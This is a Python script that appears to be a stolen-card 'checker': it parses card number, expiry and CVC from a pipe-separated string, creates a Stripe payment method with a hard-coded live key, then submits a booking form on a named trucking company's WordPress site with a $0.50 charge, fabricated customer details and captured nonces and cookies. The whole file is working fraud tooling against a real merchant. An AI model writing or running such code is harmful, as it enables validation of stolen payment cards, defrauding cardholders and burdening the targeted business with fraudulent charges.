import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51JsxR6KI6JQjr28A4vnbJu7Ak0bZXPkSlJ8VZHZXxYVvtKsd64mQ9zdpKxs0Ul9JyMj52HpAkVIl3Rz5qlsCW07n00mj43tDyT'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__stripe_mid': '3088854a-672f-4aa6-9047-3472fff9892ed73497',
	    '__stripe_sid': '82e7aa1c-d0e9-407d-878e-e0605e9e86c9e75410',
	}
	
	headers = {
	    'authority': 'pietrucking.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=3088854a-672f-4aa6-9047-3472fff9892ed73497; __stripe_sid=82e7aa1c-d0e9-407d-878e-e0605e9e86c9e75410',
	    'origin': 'https://pietrucking.com',
	    'referer': 'https://pietrucking.com/tractor-trailer-combo-2/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1744490786974',
	}
	
	data = {
	    'data': 'item_22__fluent_sf=&__fluent_protection_token_22=dERnHGWC2qLO9AVC2rQ8oJObKunyBaYwRKqO28gZOr4Pdm44Wt6fJg%2FOGYk7Ge0uqckfWeQSY13jZIFyaF4d7%2FTGjKINyoPBwH1TsHzTkNQan9NBjtN1wm7Lb3gdKA%2Fm&__fluent_form_embded_post_id=501&_fluentform_22_fluentformnonce=5ec522edd2&_wp_http_referer=%2Ftractor-trailer-combo-2%2F&datetime=04%2F12%2F2025&name%5Bfirst_name%5D=Rodam&name%5Blast_name%5D=User&input_text=&phone=0817480671&email=rodamuser08%40gmail.com&dropdown=Tractor%20Trailer%20Combo&input_text_1=2020&input_text_2=Red&input_text_4=A&input_text_6=2020&dropdown_2=Travel%20Trailer&input_text_7=B&terms-n-condition_2=on&terms-n-condition_1=on&terms-n-condition=on&payment-coupon=&custom-payment-amount=0.50&payment_method=stripe&hidden=0&__ff_all_applied_coupons=&__ff_all_applied_coupons=&__ff_all_applied_coupons=&terms-n-condition_3=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '22',
	}
	
	r2 = requests.post(
	    'https://pietrucking.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
